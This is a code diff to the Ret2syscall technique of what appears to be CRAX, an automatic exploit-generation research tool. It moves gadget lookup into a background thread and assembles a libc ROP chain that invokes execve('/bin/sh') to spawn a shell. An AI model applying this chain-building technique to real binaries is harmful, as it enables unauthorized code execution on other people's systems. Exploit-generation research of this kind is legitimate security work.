@@ -23,6 +23,7 @@
 #include <s2e/Plugins/CRAX/Techniques/Ret2csu.h>
 
 #include <cassert>
+#include <thread>
 #include <vector>
 
 #include "Ret2syscall.h"
@@ -32,25 +33,36 @@ namespace s2e::plugins::crax {
 Ret2syscall::Ret2syscall()
     : Technique(),
       m_syscallGadget() {
-    const Exploit &exploit = g_crax->getExploit();
-    const ELF &elf = exploit.getElf();
+    m_hasPopulatedRequiredGadgets = false;
 
-    const std::string gadgetAsm = "syscall ; ret";
+    std::thread([this]() {
+        const Exploit &exploit = g_crax->getExploit();
+        const ELF &elf = exploit.getElf();
+        const ELF &libc = exploit.getLibc();
+        const std::string gadgetAsm = "syscall ; ret";
 
-    if (exploit.resolveGadget(elf, gadgetAsm)) {
-        m_requiredGadgets.push_back(std::make_pair(&elf, gadgetAsm));
-        m_syscallGadget = BaseOffsetExpr::create<BaseType::VAR>(elf, Exploit::toVarName(elf, gadgetAsm));
+        if (exploit.resolveGadget(elf, gadgetAsm)) {
+            m_requiredGadgets.push_back(std::make_pair(&elf, gadgetAsm));
 
-    } else if (!elf.checksec.hasFullRELRO &&
-               elf.symbols().find("read") != elf.symbols().end()) {
-        m_syscallGadget = BaseOffsetExpr::create<BaseType::SYM>(elf, "read");
-    }
+            m_syscallGadget
+                = BaseOffsetExpr::create<BaseType::VAR>(elf, Exploit::toVarName(elf, gadgetAsm));
+
+        } else if (!elf.checksec.hasFullRELRO &&
+                   elf.symbols().find("read") != elf.symbols().end()) {
+            m_syscallGadget = BaseOffsetExpr::create<BaseType::SYM>(elf, "read");
+
+        } else {
+            m_requiredGadgets.push_back(std::make_pair(&libc, "pop rax ; ret"));
+            m_requiredGadgets.push_back(std::make_pair(&libc, "pop rdi ; ret"));
+            m_requiredGadgets.push_back(std::make_pair(&libc, "pop rsi ; ret"));
+            m_requiredGadgets.push_back(std::make_pair(&libc, "pop rdx ; ret"));
+            m_requiredGadgets.push_back(std::make_pair(&libc, "syscall"));
+        }
+
+        m_hasPopulatedRequiredGadgets = true;
+    }).detach();
 }
 
-
-bool Ret2syscall::checkRequirements() const {
-    return Technique::checkRequirements();
-}
 
 std::vector<RopPayload> Ret2syscall::getRopPayloadList() const {
     // If we've already leaked libc base, then use the gadgets from libc.
@@ -62,7 +74,7 @@ std::vector<RopPayload> Ret2syscall::getRopPayloadList() const {
 }
 
 std::vector<RopPayload> Ret2syscall::getRopPayloadListUsingLibcRop() const {
-    const Exploit &exploit = g_crax->getExploit();
+    Exploit &exploit = g_crax->getExploit();
     const ELF &libc = exploit.getLibc();
 
     // Search libc of "/bin/sh".
@@ -72,21 +84,25 @@ std::vector<RopPayload> Ret2syscall::getRopPayloadListUsingLibcRop() const {
     std::vector<uint64_t> addresses = mem(state).search(needle);
     assert(addresses.size() && "No /bin/sh in libc.so.6?");
 
+    // Register "/bin/sh" in libc as a script's variable.
     uint64_t binshAddr = addresses[0];
     uint64_t libcBase = mem(state).vmmap().getModuleBaseAddress(binshAddr);
     uint64_t binshOffset = binshAddr - libcBase;
+    std::string binshVarName = Exploit::toVarName(libc.getFilename()) + "_binsh";
+    exploit.registerSymbol(binshVarName, binshOffset);
 
+    // sys_execve("/bin/sh", 0, 0)
     RopPayload payload = {
         ConstantExpr::create(0, Expr::Int64),  // Saved RBP
-        BaseOffsetExpr::create<BaseType::VAR>(libc, exploit.resolveGadget(libc, "pop rax ; ret")),
+        BaseOffsetExpr::create<BaseType::VAR>(libc, Exploit::toVarName(libc, "pop rax ; ret")),
         ConstantExpr::create(59, Expr::Int64),
-        BaseOffsetExpr::create<BaseType::VAR>(libc, exploit.resolveGadget(libc, "pop rdi ; ret")),
-        BaseOffsetExpr::create<BaseType::VAR>(libc, binshOffset),
-        BaseOffsetExpr::create<BaseType::VAR>(libc, exploit.resolveGadget(libc, "pop rsi ; ret")),
+        BaseOffsetExpr::create<BaseType::VAR>(libc, Exploit::toVarName(libc, "pop rdi ; ret")),
+        BaseOffsetExpr::create<BaseType::VAR>(libc, binshVarName),
+        BaseOffsetExpr::create<BaseType::VAR>(libc, Exploit::toVarName(libc, "pop rsi ; ret")),
         ConstantExpr::create(0, Expr::Int64),
-        BaseOffsetExpr::create<BaseType::VAR>(libc, exploit.resolveGadget(libc, "pop rdx ; ret")),
+        BaseOffsetExpr::create<BaseType::VAR>(libc, Exploit::toVarName(libc, "pop rdx ; ret")),
         ConstantExpr::create(0, Expr::Int64),
-        BaseOffsetExpr::create<BaseType::VAR>(libc, exploit.resolveGadget(libc, "syscall")),
+        BaseOffsetExpr::create<BaseType::VAR>(libc, Exploit::toVarName(libc, "syscall")),
     };
 
     return { payload };
